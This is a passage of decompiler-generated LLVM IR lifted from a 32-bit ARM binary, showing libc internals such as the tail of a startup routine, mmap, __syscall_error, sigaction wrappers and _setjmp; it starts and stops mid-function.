bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_133e0
  %v2_13440 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_13440, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1344c = add i32 %v2_13440, -12
  store i32 %v2_1344c, i32* %r5.global-to-local, align 4
  store i32 2000, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1345c = add i32 %v2_13440, 2000
  %v4_1345c = inttoptr i32 %v3_1345c to i32*
  store i32 %arg5, i32* %v4_1345c, align 4
  %v0_1347418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1347419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1347421 = icmp uge i32 %v0_1347418, %v1_1347419
  store i1 %v3_1347421, i1* %cpsr_c.global-to-local, align 1
  %v9_1347427 = icmp eq i32 %v0_1347418, %v1_1347419
  store i1 %v9_1347427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1347421, label %dec_label_pc_134a8.lr.ph, label %dec_label_pc_13464

dec_label_pc_13464:                               ; preds = %bb84, %dec_label_pc_13464
  %v1_13464 = phi i32 [ %v1_13470, %dec_label_pc_13464 ], [ %v0_1347418, %bb84 ]
  %v0_13464 = load i32, i32* %r5.global-to-local, align 4
  %v2_13464 = and i32 %v1_13464, 1073741824
  %v3_13464 = icmp ne i32 %v2_13464, 0
  store i1 %v3_13464, i1* %cpsr_c.global-to-local, align 1
  %v4_13464 = mul i32 %v1_13464, 4
  %v5_13464 = add i32 %v4_13464, %v0_13464
  %v6_13464 = inttoptr i32 %v5_13464 to i32*
  %v7_13464 = load i32, i32* %v6_13464, align 4
  store i32 %v7_13464, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_13464)
  %v0_13470 = load i32, i32* %r4.global-to-local, align 4
  %v1_13470 = add i32 %v0_13470, 1
  store i32 %v1_13470, i32* %r4.global-to-local, align 4
  %v1_13474 = load i32, i32* %r7.global-to-local, align 4
  %v3_13474 = icmp uge i32 %v1_13470, %v1_13474
  store i1 %v3_13474, i1* %cpsr_c.global-to-local, align 1
  %v9_13474 = icmp eq i32 %v1_13470, %v1_13474
  store i1 %v9_13474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13474, label %dec_label_pc_134a8.lr.ph, label %dec_label_pc_13464

dec_label_pc_134a8.lr.ph:                         ; preds = %dec_label_pc_13464, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1347c = icmp eq i32 %v0_132c8, 0
  store i1 %v2_1347c, i1* %cpsr_z.global-to-local, align 1
  %v2_13484 = xor i1 %v2_1347c, true
  call void @__pseudo_cond_branch(i1 %v2_13484, i32 %v0_132c8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_13490 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1349c = add i32 %v2_13490, -12
  store i32 %v2_1349c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_134a8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_134a8.dec_label_pc_134a8_crit_edge, %dec_label_pc_134a8.lr.ph
  %v1_134a8 = phi i32 [ %v1_134b4, %dec_label_pc_134a8.dec_label_pc_134a8_crit_edge ], [ 0, %dec_label_pc_134a8.lr.ph ]
  %v0_134a8 = phi i32 [ %v0_134a8.pre, %dec_label_pc_134a8.dec_label_pc_134a8_crit_edge ], [ %v2_1349c, %dec_label_pc_134a8.lr.ph ]
  %v2_134a8 = and i32 %v1_134a8, 1073741824
  %v3_134a8 = icmp ne i32 %v2_134a8, 0
  store i1 %v3_134a8, i1* %cpsr_c.global-to-local, align 1
  %v4_134a8 = mul i32 %v1_134a8, 4
  %v5_134a8 = add i32 %v4_134a8, %v0_134a8
  %v6_134a8 = inttoptr i32 %v5_134a8 to i32*
  %v7_134a8 = load i32, i32* %v6_134a8, align 4
  store i32 %v7_134a8, i32* %ip.global-to-local, align 4
  store i32 79028, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_134a8)
  %v0_134b4 = load i32, i32* @r4, align 4
  %v1_134b4 = add i32 %v0_134b4, 1
  store i32 %v1_134b4, i32* @r4, align 4
  %v1_134b8 = load i32, i32* @r7, align 4
  %v3_134b8 = icmp uge i32 %v1_134b4, %v1_134b8
  store i1 %v3_134b8, i1* %cpsr_c.global-to-local, align 1
  %v9_134b8 = icmp eq i32 %v1_134b4, %v1_134b8
  store i1 %v9_134b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_134b8, label %dec_label_pc_134c0, label %dec_label_pc_134a8.dec_label_pc_134a8_crit_edge

dec_label_pc_134a8.dec_label_pc_134a8_crit_edge:  ; preds = %dec_label_pc_134a8
  %v0_134a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_134a8

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134a8
  %v2_134c4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_134c4.pre, i32* %r0.global-to-local, align 4
  %v2_134c8 = add i32 %v2_134c4.pre, -68544
  store i32 %v2_134c8, i32* %r2.global-to-local, align 4
  store i32 %v2_134c8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_134d0 = icmp eq i32 %v2_134c8, 0
  store i1 %v2_134d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134d0, label %dec_label_pc_134e8, label %dec_label_pc_134d8

dec_label_pc_134d8:                               ; preds = %dec_label_pc_134c0
  store i32 79072, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_134c8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_134e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_134e4 = inttoptr i32 %v1_134e4 to i32*
  store i32 0, i32* %v2_134e4, align 4
  %v2_134ec.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_134e8

dec_label_pc_134e8:                               ; preds = %dec_label_pc_134c0, %dec_label_pc_134d8
  %v2_134ec = phi i32 [ %v2_134c4.pre, %dec_label_pc_134c0 ], [ %v2_134ec.pre, %dec_label_pc_134d8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_134ec, i32* %r1.global-to-local, align 4
  %v2_134f0 = add i32 %v2_134ec, 128
  %v3_134f0 = inttoptr i32 %v2_134f0 to i32*
  %v4_134f0 = load i32, i32* %v3_134f0, align 4
  store i32 %v4_134f0, i32* %r2.global-to-local, align 4
  store i32 %v4_134f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_134f8 = icmp eq i32 %v4_134f0, 0
  store i1 %v2_134f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134f8, label %dec_label_pc_13510, label %dec_label_pc_13500

dec_label_pc_13500:                               ; preds = %dec_label_pc_134e8
  store i32 79112, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_134f0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1350c = load i32, i32* %r0.global-to-local, align 4
  %v2_1350c = inttoptr i32 %v1_1350c to i32*
  store i32 0, i32* %v2_1350c, align 4
  br label %dec_label_pc_13510

dec_label_pc_13510:                               ; preds = %dec_label_pc_134e8, %dec_label_pc_13500
  %v2_13510 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_13510, i32* @r0, align 4
  %v1_13514 = call i32 @_setjmp(i32 %v2_13510)
  store i32 %v1_13514, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13518 = icmp eq i32 %v1_13514, 0
  store i1 %v2_13518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13518, label %dec_label_pc_13520, label %dec_label_pc_1356c

dec_label_pc_13520:                               ; preds = %dec_label_pc_13510
  %v0_13520 = call i32 @__aeabi_read_tp()
  store i32 %v0_13520, i32* %r0.global-to-local, align 4
  %v1_13524 = add i32 %v0_13520, -1168
  store i32 %v1_13524, i32* %r2.global-to-local, align 4
  %v2_1352c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1352c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_13538 = add i32 %v2_1352c, 56
  %v3_13538 = inttoptr i32 %v2_13538 to i32*
  %v4_13538 = load i32, i32* %v3_13538, align 4
  store i32 %v4_13538, i32* %ip.global-to-local, align 4
  store i32 %v2_13510, i32* %r3.global-to-local, align 4
  %v2_13548 = add i32 %v0_13520, -1040
  %v3_13548 = inttoptr i32 %v2_13548 to i32*
  store i32 %v2_13510, i32* %v3_13548, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_13554 = load i32, i32* %ip.global-to-local, align 4
  %v1_13554 = inttoptr i32 %v0_13554 to i32*
  %v2_13554 = load i32, i32* %v1_13554, align 4
  store i32 %v2_13554, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_13564 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13608

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13510
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_13570 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_13570, i32* %ip.global-to-local, align 4
  %v2_13574 = add i32 %v2_13570, 40
  %v3_13574 = inttoptr i32 %v2_13574 to i32*
  %v4_13574 = load i32, i32* %v3_13574, align 4
  store i32 %v4_13574, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13574)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_13584 = load i32, i32* %stack_var_-416, align 4
  %v2_13588 = add i32 %v2_13584, 120
  %v3_13588 = inttoptr i32 %v2_13588 to i32*
  %v4_13588 = load i32, i32* %v3_13588, align 4
  store i32 %v4_13588, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1358c

dec_label_pc_1358c:                               ; preds = %dec_label_pc_135c0.dec_label_pc_1358c_crit_edge, %dec_label_pc_1356c
  %v0_1358c = phi i32 [ %v0_1358c.pre, %dec_label_pc_135c0.dec_label_pc_1358c_crit_edge ], [ %v4_13588, %dec_label_pc_1356c ]
  %v1_1358c = inttoptr i32 %v0_1358c to i32*
  %v2_1358c = load i32, i32* %v1_1358c, align 4
  store i32 %v0_1358c, i32* %r2.global-to-local, align 4
  store i32 %v2_1358c, i32* %r4.global-to-local, align 4
  %v1_13598 = add i32 %v2_1358c, -1
  store i32 %v1_13598, i32* %r1.global-to-local, align 4
  %v2_1359c89 = load i32, i32* %v1_1358c, align 4
  store i32 %v2_1359c89, i32* %r3.global-to-local, align 4
  %v3_135a091 = icmp uge i32 %v2_1359c89, %v2_1358c
  store i1 %v3_135a091, i1* %cpsr_c.global-to-local, align 1
  %v9_135a097 = icmp eq i32 %v2_1359c89, %v2_1358c
  store i1 %v9_135a097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_135a097, label %dec_label_pc_135a8, label %dec_label_pc_135c0

dec_label_pc_135a8:                               ; preds = %dec_label_pc_1358c, %dec_label_pc_135a8.dec_label_pc_1359c_crit_edge
  %v0_135a898 = phi i32 [ %v1_135a0.pre, %dec_label_pc_135a8.dec_label_pc_1359c_crit_edge ], [ %v2_1358c, %dec_label_pc_1358c ]
  store i32 %v0_135a898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_135b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_135b8, label %dec_label_pc_135bc, label %dec_label_pc_135a8.dec_label_pc_1359c_crit_edge

dec_label_pc_135a8.dec_label_pc_1359c_crit_edge:  ; preds = %dec_label_pc_135a8
  %v0_1359c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_135a0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1359c = inttoptr i32 %v0_1359c.pre to i32*
  %v2_1359c = load i32, i32* %v1_1359c, align 4
  store i32 %v2_1359c, i32* %r3.global-to-local, align 4
  %v3_135a0 = icmp uge i32 %v2_1359c, %v1_135a0.pre
  store i1 %v3_135a0, i1* %cpsr_c.global-to-local, align 1
  %v9_135a0 = icmp eq i32 %v2_1359c, %v1_135a0.pre
  store i1 %v9_135a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_135a0, label %dec_label_pc_135a8, label %dec_label_pc_135c0

dec_label_pc_135bc:                               ; preds = %dec_label_pc_135a8
  %v0_135bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_135bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_1358c, %dec_label_pc_135a8.dec_label_pc_1359c_crit_edge, %dec_label_pc_135bc
  %v0_135c8 = phi i32 [ %v0_135bc, %dec_label_pc_135bc ], [ %v2_1359c89, %dec_label_pc_1358c ], [ %v2_1359c, %dec_label_pc_135a8.dec_label_pc_1359c_crit_edge ]
  %v1_135c0 = phi i32 [ %v0_135bc, %dec_label_pc_135bc ], [ %v2_1358c, %dec_label_pc_1358c ], [ %v1_135a0.pre, %dec_label_pc_135a8.dec_label_pc_1359c_crit_edge ]
  %v3_135c0 = icmp uge i32 %v0_135c8, %v1_135c0
  store i1 %v3_135c0, i1* %cpsr_c.global-to-local, align 1
  %v9_135c0 = icmp eq i32 %v0_135c8, %v1_135c0
  store i1 %v9_135c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_135c0, label %dec_label_pc_135c8, label %dec_label_pc_135c0.dec_label_pc_1358c_crit_edge

dec_label_pc_135c0.dec_label_pc_1358c_crit_edge:  ; preds = %dec_label_pc_135c0
  %v0_1358c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1358c

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135c0
  %v2_135c8 = icmp ne i32 %v1_135c0, 0
  store i1 %v2_135c8, i1* %cpsr_c.global-to-local, align 1
  %v7_135c8 = icmp eq i32 %v1_135c0, 1
  store i1 %v7_135c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_135c8, label %dec_label_pc_13608, label %dec_label_pc_135d0

dec_label_pc_135d0:                               ; preds = %dec_label_pc_135c8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13608

dec_label_pc_13608:                               ; preds = %dec_label_pc_135c8, %dec_label_pc_135d0, %dec_label_pc_13520
  %storemerge2 = phi i32 [ %v0_13564, %dec_label_pc_13520 ], [ 0, %dec_label_pc_135d0 ], [ 0, %dec_label_pc_135c8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_1360c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_1360c, i32* %r0.global-to-local, align 4
  %v0_13610 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13610, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_13608
  %v2_13610 = load i32, i32* %r4.global-to-local, align 4
  %v2_13614 = load i32, i32* @r8, align 4
  %v8_13614 = shl i32 %v2_13614, %v1_1360c
  %v9_13614 = and i32 %v8_13614, %v1_1360c
  %v8_13618 = lshr i32 %v2_13614, %v9_13614
  %v9_13618 = and i32 %v8_13618, %v9_13614
  %v2_1361c = inttoptr i32 %v9_13618 to i64*
  %v3_1361c = load i64, i64* %v2_1361c, align 4
  %v5_1361c = trunc i64 %v3_1361c to i32
  %v6_1361c = udiv i64 %v3_1361c, 4294967296
  %v7_1361c = trunc i64 %v6_1361c to i32
  store i32 %v5_1361c, i32* %r1.global-to-local, align 4
  %v9_1361c = sub i32 %v7_1361c, %v2_13610
  %v3_13620 = mul i32 %v9_1361c, %v2_13610
  %v5_13628 = mul i32 %v2_13610, 4
  %v5_1362c = udiv i32 %v2_13610, 2
  %v6_13628 = and i32 %v5_1362c, %v5_13628
  %v6_1362c = and i32 %v6_13628, %v3_13620
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1362c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_13608, %bb85
  %v5_13630 = phi i32 [ %v1_1360c, %dec_label_pc_13608 ], [ %v6_1362c, %bb85 ]
  ret i32 %v5_13630

; uselistorder directives
  uselistorder i32 %v2_13610, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1360c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_135c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_135bc, { 1, 0, 2 }
  uselistorder i32 %v1_135a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1358c, { 1, 0 }
  uselistorder i32 %v2_134ec, { 1, 0 }
  uselistorder i32 %v2_134c4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_134b8, { 1, 0 }
  uselistorder i32 %v1_134b4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_134a8, { 1, 0 }
  uselistorder i32 %v1_13474, { 1, 0 }
  uselistorder i32 %v1_13470, { 1, 2, 3, 0 }
  uselistorder i32 %v1_13464, { 1, 0 }
  uselistorder i32 %v2_13440, { 1, 0, 2 }
  uselistorder i32 %v4_13424, { 1, 0, 2 }
  uselistorder i32 %v4_13414, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1335c, { 1, 2, 0 }
  uselistorder i32 %v2_13328, { 1, 2, 0 }
  uselistorder i32 %v1_13324, { 1, 2, 0 }
  uselistorder i1 %v2_13310, { 1, 0, 2 }
  uselistorder i32 %v5_13314, { 1, 0, 2, 3 }
  uselistorder i32 %v2_132e0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_132c8, { 1, 0, 2 }
  uselistorder i32 %v2_132bc, { 1, 0, 2 }
  uselistorder i32 %v3_1328c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 1, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 2, 3, 4, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 25, 24, 22, 23, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 2, 15, 16, 17, 18, 19, 20, 25, 21, 22, 24, 23, 1, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 2, 15, 17, 16, 0, 18, 19, 20, 21, 22, 23, 29, 24, 25, 28, 26, 27, 1, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 4, 3 }
  uselistorder i32 2004, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_13608, { 1, 0, 2 }
  uselistorder label %dec_label_pc_135c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_135a8, { 1, 0 }
  uselistorder label %dec_label_pc_13510, { 1, 0 }
  uselistorder label %dec_label_pc_134e8, { 1, 0 }
  uselistorder label %dec_label_pc_13464, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_133e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_133b8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_13328, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_13310, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1365c = load i32, i32* @r4, align 4
  store i32 %v3_1365c, i32* %stack_var_-16, align 4
  %v3_13668 = urem i32 %arg3, 4096
  %v2_1366c = icmp eq i32 %v3_13668, 0
  br i1 %v2_1366c, label %dec_label_pc_13690, label %dec_label_pc_13674

dec_label_pc_13674:                               ; preds = %entry
  %v0_13678 = call i32 @__aeabi_read_tp()
  store i32 %v0_13678, i32* %r0.global-to-local, align 4
  %v3_1367c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_1367c = sext i16 %v3_1367c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13688 = add i32 %v4_1367c, %v0_13678
  %v4_13688 = inttoptr i32 %v3_13688 to i32*
  store i32 22, i32* %v4_13688, align 4
  %v0_136c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_136c4

dec_label_pc_13690:                               ; preds = %entry
  %v0_136a0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_136a0, -4095
  br i1 %tmp, label %dec_label_pc_136c0, label %dec_label_pc_136a8

dec_label_pc_136a8:                               ; preds = %dec_label_pc_13690
  %v1_136ac = sub i32 0, %v0_136a0
  %v3_136b0 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_136b0 = sext i16 %v3_136b0 to i32
  %v0_136b4 = call i32 @__aeabi_read_tp()
  %v3_136b8 = add i32 %v4_136b0, %v0_136b4
  %v4_136b8 = inttoptr i32 %v3_136b8 to i32*
  store i32 %v1_136ac, i32* %v4_136b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136c0

dec_label_pc_136c0:                               ; preds = %dec_label_pc_13690, %dec_label_pc_136a8
  %v0_136c0 = phi i32 [ %v0_136a0, %dec_label_pc_13690 ], [ -1, %dec_label_pc_136a8 ]
  store i32 %v0_136c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_136c4

dec_label_pc_136c4:                               ; preds = %dec_label_pc_13674, %dec_label_pc_136c0
  %v0_136c4 = phi i32 [ %v0_136c4.pre, %dec_label_pc_13674 ], [ %v0_136c0, %dec_label_pc_136c0 ]
  store i32 %v0_136c4, i32* %r0.global-to-local, align 4
  %v2_136c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_136c8, i32* @r4, align 4
  ret i32 %v0_136c4

; uselistorder directives
  uselistorder i32 %v0_136c4, { 1, 0 }
  uselistorder i32 %v0_136a0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_136c4, { 1, 0 }
  uselistorder label %dec_label_pc_136c0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_136d8 = load i32, i32* @lr, align 4
  store i32 %v0_136d8, i32* %stack_var_-4, align 4
  %v0_136e0 = load i32, i32* @r0, align 4
  %v3_136e4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_136e4 = sext i16 %v3_136e4 to i32
  store i32 %v4_136e4, i32* @r2, align 4
  %v0_136e8 = call i32 @__aeabi_read_tp()
  %v1_136ec = sub i32 0, %v0_136e0
  store i32 %v1_136ec, i32* @r3, align 4
  %v2_136f0 = load i32, i32* @r2, align 4
  %v3_136f0 = add i32 %v2_136f0, %v0_136e8
  %v4_136f0 = inttoptr i32 %v3_136f0 to i32*
  store i32 %v1_136ec, i32* %v4_136f0, align 4
  %v2_136f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_136f8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13704 = load i32, i32* @r4, align 4
  %v6_13704 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1370c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1370c, label %dec_label_pc_13760, label %dec_label_pc_13724

dec_label_pc_13724:                               ; preds = %entry
  %v1_13724 = add i32 %arg2, 4
  %v2_13724 = inttoptr i32 %v1_13724 to i32*
  %v3_13724 = load i32, i32* %v2_13724, align 4
  store i32 %v3_13724, i32* @r3, align 4
  %v1_13728 = and i32 %v3_13724, 67108864
  %v2_13728 = icmp eq i32 %v1_13728, 0
  br i1 %v2_13728, label %dec_label_pc_13730, label %dec_label_pc_13760

dec_label_pc_13730:                               ; preds = %dec_label_pc_13724
  store i32 20, i32* @r2, align 4
  %v2_13734 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13734, i32* @r0, align 4
  %v0_13738 = call i32 @memcpy()
  %v0_13760.pre = load i32, i32* @r5, align 4
  %v0_13768.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13760

dec_label_pc_13760:                               ; preds = %dec_label_pc_13724, %entry, %dec_label_pc_13730
  %v0_13768 = phi i32 [ %arg3, %dec_label_pc_13724 ], [ %arg3, %entry ], [ %v0_13768.pre, %dec_label_pc_13730 ]
  %v0_13764 = phi i32 [ %arg2, %dec_label_pc_13724 ], [ 0, %entry ], [ %v2_13734, %dec_label_pc_13730 ]
  %v0_13760 = phi i32 [ %arg1, %dec_label_pc_13724 ], [ %arg1, %entry ], [ %v0_13760.pre, %dec_label_pc_13730 ]
  %v4_13770 = call i32 @__syscall_rt_sigaction(i32 %v0_13760, i32 %v0_13764, i32 %v0_13768, i32 8)
  store i32 %v3_13704, i32* @r4, align 4
  store i32 %v6_13704, i32* @r5, align 4
  ret i32 %v4_13770

; uselistorder directives
  uselistorder label %dec_label_pc_13760, { 2, 0, 1 }
}

define i32 @function_13784(i32 %arg1) local_unnamed_addr {
dec_label_pc_13784:
  %v0_13784 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13784, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13784
  %v2_13784 = load i32, i32* @r8, align 4
  %v4_13784 = mul i32 %v2_13784, 2
  %v5_13784 = and i32 %v4_13784, %arg1
  %v2_13788 = load i32, i32* @ip, align 4
  %v4_13788 = lshr i32 %v2_13788, %v5_13784
  %v5_13788 = sub i32 32, %v5_13784
  %v6_13788 = shl i32 %v2_13788, %v5_13788
  %v7_13788 = or i32 %v6_13788, %v4_13788
  %v9_13788 = and i32 %v7_13788, %v5_13784
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13784, %bb
  %v10_13788 = phi i32 [ %arg1, %dec_label_pc_13784 ], [ %v9_13788, %bb ]
  ret i32 %v10_13788

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_13790 = call i32 @__sigsetjmp()
  ret i32 %v0_13790
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137c0 = load i32, i32* @r7, align 4
